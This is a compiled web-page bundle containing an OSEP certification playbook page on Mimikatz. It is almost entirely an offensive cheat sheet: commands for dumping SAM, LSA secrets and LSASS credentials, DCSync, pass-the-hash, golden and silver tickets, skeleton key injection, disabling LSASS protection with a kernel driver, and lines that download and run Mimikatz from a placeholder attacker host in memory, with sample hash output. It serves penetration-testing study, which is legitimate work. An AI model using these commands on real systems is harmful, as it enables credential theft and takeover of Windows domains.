"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[2404],{1741(e,n,s){s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>h,frontMatter:()=>d,metadata:()=>r,toc:()=>o});const r=JSON.parse('{"id":"osep/Credentials/Mimikatz","title":"Mimikatz","description":"Mimikatz","source":"@site/docs/osep/Credentials/Mimikatz.md","sourceDirName":"osep/Credentials","slug":"/osep/Credentials/Mimikatz","permalink":"/OSEP-Playbook/osep/Credentials/Mimikatz","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Cracking Hashes","permalink":"/OSEP-Playbook/osep/Credentials/Cracking Hashes"},"next":{"title":"Pass-The-Hash","permalink":"/OSEP-Playbook/osep/Credentials/Pass-The-Hash"}}');var i=s(4848),t=s(8453);const d={},l=void 0,c={},o=[{value:"<strong>Mimikatz</strong>",id:"mimikatz",level:3},{value:"<strong>Commands Without Credentials</strong>",id:"commands-without-credentials",level:3},{value:"<strong>Commands That Required Credentials</strong>",id:"commands-that-required-credentials",level:3},{value:"<strong>Command One-Liners</strong>",id:"command-one-liners",level:3},{value:"<strong>LSA Protection Bypass</strong>",id:"lsa-protection-bypass",level:3},{value:"<strong>MiniDump</strong>",id:"minidump",level:3},{value:"<strong>Kiwi Meterpreter Built In Module</strong>",id:"kiwi-meterpreter-built-in-module",level:3},{value:"<strong>Invoke-Mimikatz</strong>",id:"invoke-mimikatz",level:3}];function a(e){const n={a:"a",code:"code",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,t.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h3,{id:"mimikatz",children:(0,i.jsx)(n.strong,{children:"Mimikatz"})}),"\n",(0,i.jsx)(n.h3,{id:"commands-without-credentials",children:(0,i.jsx)(n.strong,{children:"Commands Without Credentials"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:(0,i.jsx)(n.strong,{children:"Purpose"})}),(0,i.jsx)(n.th,{children:(0,i.jsx)(n.strong,{children:"Command Example"})})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Privilege Escalation to SYSTEM"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"privilege::debugtoken::elevate"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping Password Hashes from SAM"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"lsadump::sam"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping Credentials from LSA Secrets"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"lsadump::secrets"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping Domain Cached Credentials (DCC)"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"lsadump::cache"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Retrieve trust authentication information."})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"lsadump::trust"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping Kerberos Tickets"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::tickets"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Extracts Credentials from LSA"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"lsadump::lsa /inject"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping WDIGEST Credentials"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::wdigest"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping Clear-Text Credentials"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::logonpasswords"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping NTLM Hashes from LSASS Memory"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::msv"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping Kerberos Keys"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::kerberos"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping SSP Credentials"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::ssp"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping TSPKG Credentials"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::tspkg"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Listing Available Privileges"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"privilege::list"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Extracts Passwords from Windows Vault"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"vault::cred /patch"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping Security Account Manager (SAM)"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"lsadump::sam /system:<SYSTEM> /sam:<SAM>"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dumping Hashes from Active Directory"})}),(0,i.jsxs)(n.td,{children:[(0,i.jsx)(n.code,{children:"lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME>"}),"\xa0(requires replication rights, not direct credentials)"]})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"commands-that-required-credentials",children:(0,i.jsx)(n.strong,{children:"Commands That Required Credentials"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:(0,i.jsx)(n.strong,{children:"Purpose"})}),(0,i.jsx)(n.th,{children:(0,i.jsx)(n.strong,{children:"Command Example"})})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Pass-the-Hash Attack (PTH)"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Pass-the-Ticket Attack (PTT)"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"kerberos::ptt <ticket.kirbi>"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Over-Pass-The-Hash / Pass-The-Key (Kerberos Ticket)"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<AES256_HASH> /run:<COMMAND>"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Golden Ticket Creation"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID> /ticket:<OUTPUT_TICKET>"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Silver Ticket Creation"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SERVICE/SERVER> /service:<SERVICE> /rc4:<NTLM_HASH> /id:<USER_RID> /ptt"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Dump Kerberos Tickets for Specific User"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::tickets /export"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Skeleton Key Injection"})}),(0,i.jsxs)(n.td,{children:[(0,i.jsx)(n.code,{children:"misc::skeleton"}),"\xa0(Injects a skeleton key, allowing login as any user using the password\xa0",(0,i.jsx)(n.code,{children:"mimikatz"}),")"]})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Kerberos Silver Ticket Creation (Advanced)"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_HASH> /service:<SERVICE> /sid:<DOMAIN_SID>"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Over-Pass-the-Hash (with RC4)"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"DPAPI Credential Decryption"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"dpapi::cred /in:<CREDENTIAL_FILE>"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Extracting TGT from LSASS Memory"})}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:"kerberos::tgt"})})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"command-one-liners",children:(0,i.jsx)(n.strong,{children:"Command One-Liners"})}),"\n",(0,i.jsxs)(n.p,{children:["When using tools like\xa0",(0,i.jsx)(n.code,{children:"Evil-WinRM"}),"\xa0or unstable reverse shells, running\xa0",(0,i.jsx)(n.code,{children:"mimikatz"}),"\xa0can be problematic. In such cases,\xa0",(0,i.jsx)(n.strong,{children:"Mimikatz one-liner commands"}),"\xa0offer an effective workaround. Here are different approaches:"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["(Recommended Option)\xa0",(0,i.jsx)(n.strong,{children:"Using Mimikatz One-Liners"}),":"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:'.\\mimikatz.exe "privilege::debug" "[command]" "exit"\n\n# Example for Dumping Passwords (using cmd.exe or PowerShell)\nmimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"\n\n# Example for Passing the Hash\nmimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.local /rc4:HASH" "exit"\n\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Running Mimikatz with\xa0",(0,i.jsx)(n.strong,{children:"Command Redirection"}),": ensures output is saved to a file for later retrieval if the shell disconnects."]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:'mimikatz.exe "privilege::debug" "[command]" "exit" > C:\\temp\\mimikatz_output.txt\n\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Running Mimikatz via\xa0",(0,i.jsx)(n.strong,{children:"PowerShell Encoded Commands"}),":"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:'$command = "privilege::debug [command] exit"\n$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))\necho $encodedCommand\n\npowershell -enc <encodedCommand>\n\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["One-Liner with\xa0",(0,i.jsx)(n.strong,{children:"Remote Execution"}),":"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"# Evil-WinRM (we need to connect and then execute it, not possible to send it within the same command)\nevil-winrm -i [target_ip] -u [username] -p [password]\nmimikatz.exe 'privilege::debug' '[command]' 'exit'\n\n# PsExec\nimpacket-psexec DOMAIN/username:password@target_ip \"C:\\\\Windows\\\\System32\\\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'\"\n\n# VMIExec\nimpacket-vmiexec DOMAIN/username:password@target_ip \"C:\\\\Windows\\\\System32\\\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'\"\n\n# Web Download\npowershell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://[attacker_ip]/mimikatz.exe', 'C:\\\\temp\\\\mimikatz.exe')\"\npowershell -Command \"C:\\\\temp\\\\mimikatz.exe 'privilege::debug' '[command]' 'exit'\"\n\n"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Using Mimikatz with\xa0",(0,i.jsx)(n.strong,{children:"Minimal Output"}),":"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:'mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1\n\n'})}),"\n",(0,i.jsx)(n.h3,{id:"lsa-protection-bypass",children:(0,i.jsx)(n.strong,{children:"LSA Protection Bypass"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Theory"}),"\xa0Since the release of Mimikatz in 2012, Microsoft introduced defenses like\xa0",(0,i.jsx)(n.strong,{children:"LSA Protection"}),"\xa0and\xa0",(0,i.jsx)(n.strong,{children:"Credential Guard"}),"\xa0to block credential dumping. Starting with Windows 8, processes can run as\xa0",(0,i.jsx)(n.strong,{children:"Protected Process Light (PPL)"}),", which prevents even SYSTEM-level processes from reading their memory if PPL is enabled."]}),"\n",(0,i.jsxs)(n.p,{children:["For LSASS, this is controlled by the registry key:\xa0",(0,i.jsx)(n.code,{children:"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL = 1"}),". When enabled, LSASS runs as PPL, and tools like Mimikatz fail to access its memory. By default, this setting is\xa0",(0,i.jsx)(n.strong,{children:"disabled"}),"for compatibility reasons, but in hardened systems it may already be turned on."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Bypassing PPL"})}),"\n",(0,i.jsxs)(n.p,{children:["PPL is enforced at the\xa0",(0,i.jsx)(n.strong,{children:"kernel level"}),"\xa0(via the EPROCESS object). With\xa0",(0,i.jsx)(n.strong,{children:"kernel code execution"}),", LSA protection can be disabled to dump creds."]}),"\n",(0,i.jsxs)(n.p,{children:["Mimikatz includes\xa0",(0,i.jsx)(n.strong,{children:"mimidrv.sys"}),", a signed driver that can be loaded (requires\xa0",(0,i.jsx)(n.strong,{children:"Admin/SYSTEM"}),"\xa0+\xa0",(0,i.jsx)(n.code,{children:"SeLoadDriverPrivilege"}),") to bypass PPL and access LSASS memory."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Simple Extracting Credentials"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"# We must have SYSTEM or local administrator permissions\nmimikatz.exe\n\nmimikatz # privilege::debug\n\nmimikatz # sekurlsa::logonpasswords\n\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Steps to Bypass LSA"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Check if LSA Protecting is enabled"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"# 0=disabled, 1=enabled\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsxs)(n.strong,{children:["Load the\xa0",(0,i.jsx)(n.code,{children:"mimidrv.sys"}),"\xa0driver"]})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"mimikatz # !+\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Disable the PPL Protection for LSASS"})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"mimikatz # !processprotect /process:lsass.exe /remove\nProcess : lsass.exe\nPID 536 -> 00/00 [0-0-0]\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Extract the Credentials"})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"mimikatz # sekurlsa::logonpasswords\n\n"})}),"\n",(0,i.jsx)(n.h3,{id:"minidump",children:(0,i.jsx)(n.strong,{children:"MiniDump"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Compile the MiniDump project"}),",\xa0",(0,i.jsx)(n.a,{href:"https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/MiniDump",children:"GitHub Reference"}),", alternative you can use Task Manager if have a GUI to dump this file."]}),"\n",(0,i.jsx)(n.p,{children:"Create MiniDump"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/14.3.2_minidump.png",alt:"Create MiniDump"})}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Run the tool"})}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"MiniDump.exe\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Run Mimikatz"})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"mimikatz.exe\n\n# lsass.dmp is the dumped file from the previous step\nmimikatz # sekurlsa::minidump lsass.dmp\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Extract the credentials"})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"mimikatz # sekurlsa::logonpasswords\n\n"})}),"\n",(0,i.jsx)(n.h3,{id:"kiwi-meterpreter-built-in-module",children:(0,i.jsx)(n.strong,{children:"Kiwi Meterpreter Built In Module"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Steps"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Load the module"}),"\xa0in a current Meterpreter session"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"meterpreter > load kiwi\nLoading extension kiwi...\n  .#####.   mimikatz 2.2.0 20191125 (x64/windows)\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/\n\nSuccess.\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"(Optional)"}),"\xa0Check the current available options"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"meterpreter > help\n\n...\n\nKiwi Commands\n=============\n\n    Command                Description\n    -------                -----------\n    creds_all              Retrieve all credentials (parsed)\n    creds_kerberos         Retrieve Kerberos creds (parsed)\n    creds_livessp          Retrieve Live SSP creds\n    creds_msv              Retrieve LM/NTLM creds (parsed)\n    creds_ssp              Retrieve SSP creds\n    creds_tspkg            Retrieve TsPkg creds (parsed)\n    creds_wdigest          Retrieve WDigest creds (parsed)\n    dcsync                 Retrieve user account information via DCSync (unparsed)\n    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync\n    golden_ticket_create   Create a golden kerberos ticket\n    kerberos_ticket_list   List all kerberos tickets (unparsed)\n    kerberos_ticket_purge  Purge any in-use kerberos tickets\n    kerberos_ticket_use    Use a kerberos ticket\n    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)\n    lsa_dump_sam           Dump LSA SAM (unparsed)\n    lsa_dump_secrets       Dump LSA secrets (unparsed)\n    password_change        Change the password/hash of a user\n    wifi_list              List wifi profiles/creds for the current user\n    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Extract Credentials"})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"meterpreter > creds_msv\n[+] Running as SYSTEM\n[*] Retrieving msv credentials\nmsv credentials\n===============\n\nUsername  Domain  NTLM                              SHA1\n--------  ------  ----                              ----\nluiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837\n....\n\n"})}),"\n",(0,i.jsx)(n.h3,{id:"invoke-mimikatz",children:(0,i.jsx)(n.strong,{children:"Invoke-Mimikatz"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Steps"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Download the code from\xa0",(0,i.jsx)(n.a,{href:"https://github.com/Extravenger/OSEPlayground/tree/main/10%20-%20Post%20Exploitation/Mimikatz",children:"GitHub"})]}),"\n",(0,i.jsx)(n.li,{children:"Start an HTTP Server"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"python3 -m http.server 80\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Download it to the victim and load it directly in memory"})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"iex(New-Object net.webclient).downloadstring('http://[ATTACKER_IP]/Invoke-Mimikatz.ps1')\n\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Disable PPL"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"Invoke-Mimikatz -Command '\"!processprotect /process:lsass.exe /remove\"'\n\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"All-In-One Command"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:'Invoke-Mimikatz -Command \'"privilege::debug" "token::elevate" "vault::cred /patch" "lsadump::sam" "sekurlsa::credman" "sekurlsa::ssp" "sekurlsa::wdigest" "sekurlsa::logonpasswords" "lsadump::secrets"\'\n\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Command by Command"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:'# Get passwords of scheduled tasks.\nInvoke-Mimikatz -Command \'"privilege::debug" "token::elevate" "vault::cred /patch"\'\n\n# Dump logged-on Accounts hashes.\nInvoke-Mimikatz -Command \'"privilege::debug" "sekurlsa::logonpasswords"\'\n\n# Local Accounts Credentials\nInvoke-Mimikatz -Command \'"privilege::debug" "token::elevate" "lsadump::sam"\'\n\n# Dump LSA secrets\nInvoke-Mimikatz -Command \'"privilege::debug" "token::elevate" "lsadump::secrets"\'\n\n# List Kerberos encryption keys\nInvoke-Mimikatz -Command \'"privilege::debug" sekurlsa::ekeys"\'\n\n# List Credentials Manager\nInvoke-Mimikatz -Command \'"privilege::debug" "sekurlsa::credman"\'\n\n# Lists SSP credentials\nInvoke-Mimikatz -Command \'"privilege::debug" "sekurlsa::ssp"\'\n\n# List WDigest credentials\nInvoke-Mimikatz -Command \'"privilege::debug" "sekurlsa::wdigest"\'\n\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"DCSync"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"# Sometimes DC need to be specified too with: /dc:[DOMAIN].com\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:NETBIOS\\[USER]\"'\n\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Golden Ticket"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'\n\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},8453(e,n,s){s.d(n,{R:()=>d,x:()=>l});var r=s(6540);const i={},t=r.createContext(i);function d(e){const n=r.useContext(t);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:d(e.components),r.createElement(t.Provider,{value:n},e.children)}}}]);